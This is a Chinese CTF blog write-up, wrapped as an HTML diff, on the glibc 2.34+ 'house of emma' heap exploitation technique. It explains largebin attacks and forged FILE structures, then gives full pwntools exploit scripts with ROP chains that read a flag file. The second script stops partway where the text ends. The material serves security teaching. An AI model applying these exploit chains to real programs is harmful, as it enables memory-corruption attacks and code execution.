@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>house_of_emma - 广莫之野</title>
+  <meta charset="UTF-8">
+  <meta name="description" content>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/home.png" type="image/png">
+  <meta name="description" content="2.34以后malloc_hook和free_hook被去除,这种IO打法可以使用,以湖湘杯2021-house of emma为例">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_emma">
+<meta property="og:url" content="http://shiroinu.top/2021/11/17/house-of-emma/index.html">
+<meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="2.34以后malloc_hook和free_hook被去除,这种IO打法可以使用,以湖湘杯2021-house of emma为例">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-11-17T12:02:56.040Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house_of_emma">
+<meta name="twitter:description" content="2.34以后malloc_hook和free_hook被去除,这种IO打法可以使用,以湖湘杯2021-house of emma为例">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1637381239022">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tsts">
+            <img src="/images/head.png" alt="tsts">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>32</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/others/" style="font-size: 10px;">others</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a>
+    </div>
+    
+  </div>
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2021 tsts
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>house_of_emma</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年11月17日</a>
+    <a><i class="nexmoefont icon-areachart"></i>2.8k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 16 分钟</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
+    
+  </div>
+  <article>
+    <p>2.34以后malloc_hook和free_hook被去除,这种IO打法可以使用,以湖湘杯2021-house of emma为例</p>
+<a id="more"></a>
+
+<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>存在UAF</p>
+<h2 id="对应题目要素"><a href="#对应题目要素" class="headerlink" title="对应题目要素"></a>对应题目要素</h2><ul>
+<li>使用calloc</li>
+<li>size限制large_bin<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2></li>
+<li>泄露heap和libc</li>
+<li>三次largebin attack 写三个堆地址</li>
+</ul>
+<ol>
+<li><p>攻击tls + 0x30处的随机值</p>
+<ul>
+<li><p>因为IO_cookie_write/read中会对指针进行解密</p>
+<pre><code class="c">/* Type of the TCB.  */
+typedef struct
+{
+void *tcb;            /* Points to this structure.  */
+dtv_t *dtv;            /* Vector of pointers to TLS data.  */
+thread_t self;        /* This thread&#39;s control port.  */
+int multiple_threads;
+uintptr_t sysinfo;
+uintptr_t stack_guard;
+uintptr_t pointer_guard;
+int gscope_flag;
+int private_futex;
+/* Reservation of some values for the TM ABI.  */
+void *__private_tm[4];
+/* GCC split stack support.  */
+void *__private_ss;
+
+/* Keep this field last, so fields above can continue being compatible with
+  the Linux version. */
+mach_port_t reply_port;      /* This thread&#39;s reply port.  */
+struct hurd_sigstate *_hurd_sigstate;
+} tcbhead_t;</code></pre>
+<pre><code class="c">static ssize_t
+_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
+{
+struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
+cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;
+#ifdef PTR_DEMANGLE
+PTR_DEMANGLE (write_cb);
+#endif
+
+if (write_cb == NULL)
+  {
+  fp-&gt;_flags |= _IO_ERR_SEEN;
+  return 0;
+  }
+
+ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);
+if (n &lt; size)
+  fp-&gt;_flags |= _IO_ERR_SEEN;
+
+return n;
+}
+#  define PTR_MANGLE(dreg, reg, tmpreg) \
+ld    [%g7 + POINTER_GUARD], tmpreg; \
+xor    reg, tmpreg, dreg
+#  define PTR_DEMANGLE(dreg, reg, tmpreg) PTR_MANGLE (dreg, reg, tmpreg)</code></pre>
+<p>其中<code>POINTER_GUARD</code>就是tls结构体中的<code>pointer_guard</code><br>在汇编中可以更加清楚的看到解密过程</p>
+<pre><code class="assembly">0x7ffff7e3a9f6 &lt;_IO_cookie_write+6&gt;     mov    rbx, rdi
+0x7ffff7e3a9f9 &lt;_IO_cookie_write+9&gt;     sub    rsp, 8
+0x7ffff7e3a9fd &lt;_IO_cookie_write+13&gt;    mov    rax, qword ptr [rdi + 0xf0]
+0x7ffff7e3aa04 &lt;_IO_cookie_write+20&gt;    ror    rax, 0x11
+0x7ffff7e3aa08 &lt;_IO_cookie_write+24&gt;    xor    rax, qword ptr fs:[0x30]
+0x7ffff7e3aa11 &lt;_IO_cookie_write+33&gt;    test   rax, rax
+0x7ffff7e3aa14 &lt;_IO_cookie_write+36&gt;    je     _IO_cookie_write+55 &lt;0x7ffff7e3aa27&gt;
+0x7ffff7e3aa16 &lt;_IO_cookie_write+38&gt;    mov    rbp, rdx
+0x7ffff7e3aa19 &lt;_IO_cookie_write+41&gt;    mov    rdi, qword ptr [rdi + 0xe0]
+0x7ffff7e3aa20 &lt;_IO_cookie_write+48&gt;    call   rax</code></pre>
+<p>rdi是stderr的指针,在此处是伪造的IO_file,很明显,<code>_IO_cookie_write</code>会取<code>io_file + 0xf0</code>处的值先<code>ror 0x11</code>,再<code>xor fs+0x30</code>处的值并调用,因此将想要调用的gadget 先xor key再rol 0x11即可控制执行流.同时rdi也可控为<code>io_file+0xe0</code>处的值.</p>
+</li>
+</ul>
+</li>
+<li><p>攻击stderr指针 用于控制<code>vfprintf</code>的执行流,在调用<code>IO_xput</code>的时候通过伪造vtable使其进入<code>_IO_cookie_write</code></p>
+</li>
+<li><p>攻击main_arena.topchunk 用于触发fflush</p>
+</li>
+</ol>
+<h2 id="打法1-利用svcudp-reply-26栈迁移"><a href="#打法1-利用svcudp-reply-26栈迁移" class="headerlink" title="打法1-利用svcudp_reply+26栈迁移"></a>打法1-利用<code>svcudp_reply+26</code>栈迁移</h2><p>汇编如下,控制rdi的情况下可控rbp,可以栈迁移</p>
+<pre><code class="assembly">0x00000000001482ba:
+    mov rbp, qword ptr [rdi + 0x48]; 
+    mov rax, qword ptr [rbp + 0x18]; 
+    lea r13, [rbp + 0x10]; 
+    mov dword ptr [rbp + 0x10], 0; 
+    mov rdi, r13; 
+    call qword ptr [rax + 0x28];</code></pre>
+<h3 id="fake-file伪造细节"><a href="#fake-file伪造细节" class="headerlink" title="fake_file伪造细节"></a>fake_file伪造细节</h3><p>file结构体的size是0xe0,在<code>IO_cookie_write</code>的call之前rdi正是从file+0xe0取值,在这里选择将rdi设置成<code>chunk + 0x100</code></p>
+<p>R 是file + 0xf0的值 解密后就是要调用的gadget</p>
+<p>这样<code>chunk + 0x148</code>处就是rbp的值,这里选择是<code>rbp = chunk + 0x150</code></p>
+<p>rax 是<code>chunk + 0x168</code>处的值,<code>rax = chunk + 0x100</code></p>
+<p>最后两次调用leave_ret栈迁移rop即可</p>
+<pre><code class="python">io_cookie_jumps = libc_base + 0x1F3AE0
+R = rol((stack_gadget ^ xor_key),0x11,64)
+fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(0)                    #_IO_buf_base
+fake_file+=p64(0)                    #_IO_buf_end 
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1F5720)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(io_cookie_jumps + 0x40)                       #vtable
+#0xe0
+fake_file += p64(heap_base + 0x22a0 + 0x100) # rdi in gadget
+fake_file += p64(0)
+fake_file += p64(R) + p64(0)
+#0x100 &lt;- rax
+fake_file += &#39;\x00&#39; * 0x28
+fake_file += p64(leave_ret) # rax+0x28
+fake_file += p64(0) * 3
+# 0x148
+fake_file += p64(heap_base + 0x22a0 + 0x100 + 0x50) # rbp
+# 0x150
+fake_file += p64(heap_base + 0x22a0 + 0x100 + 0x70 - 0x8) # &lt;-rbp
+fake_file += p64(leave_ret)
+fake_file += p64(0) 
+fake_file += p64(heap_base + 0x22a0 + 0x100) 
+
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall_ret)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base +libc.symbols[&#39;write&#39;])
+
+fake_file += rop
+fake_file += p64(0) * 2 + &#39;./flag\x00\x00&#39; + p64(0)</code></pre>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+import struct
+context.log_level = &#39;DEBUG&#39;
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+sh = process(&#39;./emma&#39;)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+rol = lambda val, r_bits, max_bits: \
+    (val &lt;&lt; r_bits%max_bits) &amp; (2**max_bits-1) | \
+    ((val &amp; (2**max_bits-1)) &gt;&gt; (max_bits-(r_bits%max_bits)))
+
+ror = lambda val, r_bits, max_bits: \
+    ((val &amp; (2**max_bits-1)) &gt;&gt; r_bits%max_bits) | \
+    (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (2**max_bits-1))
+
+def add(idx,size):
+    opcode = &quot;\x01&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    opcode += struct.pack(&quot;&lt;H&quot;,size)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+def delete(idx):
+    opcode = &quot;\x02&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+def show(idx):
+    opcode = &quot;\x03&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # # sh.recvuntil(&quot;az&quot;)
+    # data = sh.recv(4)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+    # return data
+def edit(idx,content):
+    opcode = &quot;\x04&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    opcode += struct.pack(&quot;&lt;H&quot;,len(content))
+    opcode += content
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+payload = add(0,0x440)
+payload += add(1,0x500)
+payload += add(2,0x430)
+payload += add(3,0x500)
+payload += delete(0)
+payload += delete(2)
+payload += show(0)
+payload += show(2)
+payload += &#39;\x05&#39;
+sh.sendline(payload)
+libc_base = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x1F2CC0
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+sh.recvuntil(&#39;Show Done\n&#39;)
+heap_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - 0x22A0
+log.success(&quot;heap_base = &quot; + hex(heap_base))
+large_payload = p64(libc_base+ 0x1F30C0) * 2 + p64(heap_base + 0x22A0)
+TLS = libc_base - 0x28C0
+topchunk = libc_base + 0x1F2CC0
+
+
+rdi_ret = 0x000000000002daa2 + libc_base
+rsi_ret = 0x0000000000037c0a + libc_base
+rdx_r12_ret =  0x00000000001066e1 + libc_base
+ret = 0x000000000002d446 + libc_base
+syscall_ret = 0x00000000000883b6 + libc_base
+rax_ret = 0x00000000000446c0 + libc_base
+leave_ret = 0x0000000000052d72 + libc_base
+stack_gadget = 0x00000000001482ba + libc_base
+xor_key = heap_base + 0x22a0
+R = rol((stack_gadget ^ xor_key),0x11,64)
+&quot;&quot;&quot;
+0x00000000001482ba
+    mov rbp, qword ptr [rdi + 0x48]; 
+    mov rax, qword ptr [rbp + 0x18]; 
+    lea r13, [rbp + 0x10]; 
+    mov dword ptr [rbp + 0x10], 0; 
+    mov rdi, r13; 
+    call qword ptr [rax + 0x28];
+&quot;&quot;&quot;
+
+
+flag_addr = heap_base + 0x22a0 + 0x238
+buf_addr = heap_base + 0x4000
+
+
+io_cookie_jumps = libc_base + 0x1F3AE0
+fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(0)                    #_IO_buf_base
+fake_file+=p64(0)                    #_IO_buf_end 
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1F5720)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(io_cookie_jumps + 0x40)                       #
+#0xe0
+fake_file += p64(heap_base + 0x22a0 + 0x100) # rdi in gadget
+fake_file += p64(0)
+fake_file += p64(R) + p64(0)
+#0x100 &lt;- rax
+fake_file += &#39;\x00&#39; * 0x28
+fake_file += p64(leave_ret) # rax+0x28
+fake_file += p64(0) * 3
+# 0x148
+fake_file += p64(heap_base + 0x22a0 + 0x100 + 0x50) # rbp
+# 0x150
+fake_file += p64(heap_base + 0x22a0 + 0x100 + 0x70 - 0x8) # &lt;-rbp
+fake_file += p64(leave_ret)
+fake_file += p64(0) 
+
+fake_file += p64(heap_base + 0x22a0 + 0x100) 
+log.info(hex(len(fake_file)))
+
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall_ret)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base +libc.symbols[&#39;write&#39;])
+
+fake_file += rop
+fake_file += p64(0) * 2 + &#39;./flag\x00\x00&#39; + p64(0)
+
+payload = add(0,0x440)
+payload += add(2,0x430)
+payload += delete(0)
+payload += add(4,0x500)
+payload += delete(2)
+payload += edit(0,large_payload+p64(TLS + 0x30 - 0x20))
+payload += add(4,0x500)
+payload += add(2,0x430)
+payload += delete(2)
+payload += edit(0,large_payload+p64(libc_base + libc.symbols[&#39;stderr&#39;] - 0x20))
+payload += add(4,0x500)
+payload += add(2,0x430)
+payload += delete(2)
+payload += edit(0,large_payload+p64(topchunk - 0x20) + fake_file[0x30:])
+payload += add(4,0x500)
+
+payload += &#39;\x05&#39;
+gdb.attach(sh,&#39;b * $rebase(0x1495)&#39;)
+
+sh.sendline(payload)
+
+
+# payload += edit(0,0x)
+
+
+sh.interactive()
+
+</code></pre>
+<h2 id="打法2-setcontext"><a href="#打法2-setcontext" class="headerlink" title="打法2-setcontext"></a>打法2-setcontext</h2><p>之前打free_hook时的经典gadget</p>
+<pre><code class="assembly">mov     rdx, [rdi+8]
+mov     [rsp+0C8h+var_C8], rax
+call    qword ptr [rdx+20h]</code></pre>
+<h3 id="fake-file伪造细节-1"><a href="#fake-file伪造细节-1" class="headerlink" title="fake_file伪造细节"></a>fake_file伪造细节</h3><p><code>frame.rsp</code>就是rop链开始的地址</p>
+<p>gadget中rdi依旧选择是<code>chunk + 0x100</code></p>
+<p>rdi + 8 = rdx</p>
+<p>rdi + 0x28 = setcontext</p>
+<p>拼接这0x28长度的payload + frame[0x28:]即可</p>
+<pre><code class="python">R = rol((rdx_gadget ^ xor_key),0x11,64)
+
+
+frame = SigreturnFrame()
+frame.rsp = heap_base + 0x22a0 + 0x200 + 0x18
+frame.rip = ret
+
+flag_addr = heap_base + 0x22a0 + 0x200 + 0x8
+buf_addr = heap_base + 0x4000
+
+
+io_cookie_jumps = libc_base + 0x1F3AE0
+fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(0)                    #_IO_buf_base
+fake_file+=p64(0)                    #_IO_buf_end 
+fake_file+=p64(0)                       #_IO_save_base
+fake_file+=p64(0)                       #_IO_backup_base 
+fake_file+=p64(0)                       #_IO_save_end
+fake_file+=p16(0) *4                       #_markers
+fake_file+=p16(0) *4                       #chain   could be a anathor file struct
+fake_file+=p32(0)                       #_fileno
+fake_file+=p32(0)                       #_flags2
+fake_file+=p64(0)      #_old_offset
+fake_file+=p16(0)                       #_cur_column
+fake_file+=p8(0)                        #_vtable_offset
+fake_file+=p8(0)                      #_shortbuf
+fake_file+=p32(0)
+fake_file+=p64(libc_base + 0x1F5720)                    #_lock   _IO_flockfile (fp);
+fake_file+=p64(0)      #_offset
+fake_file+=p64(0)                       #_codecvt
+fake_file+=p64(0)                    #_wide_data
+fake_file+=p64(0)                       #_freeres_list
+fake_file+=p64(0)                       #_freeres_buf
+fake_file+=p64(0)                       #__pad5
+fake_file+=p32(0)              #_mode
+fake_file+=p32(0)                       #unused2
+fake_file+=p64(0)*2                     #unused2
+fake_file+=p64(io_cookie_jumps + 0x40)                       #
+#0xe0
+fake_file += p64(heap_base + 0x22a0 + 0x100) # rdi in gadget
+fake_file += p64(0)
+fake_file += p64(R) + p64(0)
+# 0x100
+fake_file += p64(0)
+fake_file += p64(heap_base + 0x22a0 + 0x100) #rdx
+
+fake_file += p64(0)*2
+fake_file += p64(libc_base + libc.symbols[&#39;setcontext&#39;] + 61)
+fake_file += str(frame)[0x28:]
+
+fake_file += p64(0) * 2 + &#39;./flag\x00\x00&#39; + p64(0)
+
+log.info(hex(len(fake_file)))
+
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall_ret)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base + libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc_base +libc.symbols[&#39;write&#39;])
+fake_file += rop
+</code></pre>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+import struct
+context.log_level = &#39;DEBUG&#39;
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+
+sh = process(&#39;./emma&#39;)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+rol = lambda val, r_bits, max_bits: \
+    (val &lt;&lt; r_bits%max_bits) &amp; (2**max_bits-1) | \
+    ((val &amp; (2**max_bits-1)) &gt;&gt; (max_bits-(r_bits%max_bits)))
+
+ror = lambda val, r_bits, max_bits: \
+    ((val &amp; (2**max_bits-1)) &gt;&gt; r_bits%max_bits) | \
+    (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (2**max_bits-1))
+
+def add(idx,size):
+    opcode = &quot;\x01&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    opcode += struct.pack(&quot;&lt;H&quot;,size)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+def delete(idx):
+    opcode = &quot;\x02&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+def show(idx):
+    opcode = &quot;\x03&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # # sh.recvuntil(&quot;az&quot;)
+    # data = sh.recv(4)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+    # return data
+def edit(idx,content):
+    opcode = &quot;\x04&quot;
+    opcode += struct.pack(&quot;B&quot;,idx)
+    opcode += struct.pack(&quot;&lt;H&quot;,len(content))
+    opcode += content
+    # opcode += &#39;\x05&#39;
+    return opcode
+    # sh.send(opcode)
+    # sh.recvuntil(&quot;opcode\n&quot;)
+payload = add(0,0x440)
+payload += add(1,0x500)
+payload += add(2,0x430)
+payload += add(3,0x500)
+payload += delete(0)
+payload += delete(2)
+payload += show(0)
+payload += show(2)
+payload += &#39;\x05&#39;
+sh.sendline(payload)
+libc_base = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;)) - 0x1F2CC0
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+sh.recvuntil(&#39;Show Done\n&#39;)
+heap_base = u64(sh.recv(6).ljust(8,&#39;\x00&#39;)) - 0x22A0
+log.success(&quot;heap_base = &quot; + hex(heap_base))
+large_payload = p64(libc_base+ 0x1F30C0) * 2 + p64(heap_base + 0x22A0)
+TLS = libc_base - 0x28C0
+topchunk = libc_base + 0x1F2CC0
+
+
+rdi_ret = 0x000000000002daa2 + libc_base
+rsi_ret = 0x0000000000037c0a + libc_base
+rdx_r12_ret =  0x00000000001066e1 + libc_base
+ret = 0x000000000002d446 + libc_base
+syscall_ret = 0x00000000000883b6 + libc_base
+rax_ret = 0x00000000000446c0 + libc_base
+leave_ret = 0x0000000000052d72 + libc_base
+rdx_gadget = 0x0000000000146020 + libc_base
+# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
+xor_key = heap_base + 0x22a0
+R = rol((rdx_gadget ^ xor_key),0x11,64)
+
+
+
+frame = SigreturnFrame()
+frame.rsp = heap_base + 0x22a0 + 0x200 + 0x18
+frame.rip = ret
+
+flag_addr = heap_base + 0x22a0 + 0x200 + 0x8
+buf_addr = heap_base + 0x4000
+
+
+io_cookie_jumps = libc_base + 0x1F3AE0
+fake_file=p64(0)               #_flags
+fake_file+=p64(0)             #_IO_read_ptr
+fake_file+=p64(0)             #_IO_read_end
+fake_file+=p64(0)             #_IO_read_base
+fake_file+=p64(1)             #_IO_write_base
+fake_file+=p64(0xffffffffffff)             #_IO_write_ptr
+fake_file+=p64(0)         #_IO_write_end
+fake_file+=p64(0)                    #_IO_buf_base
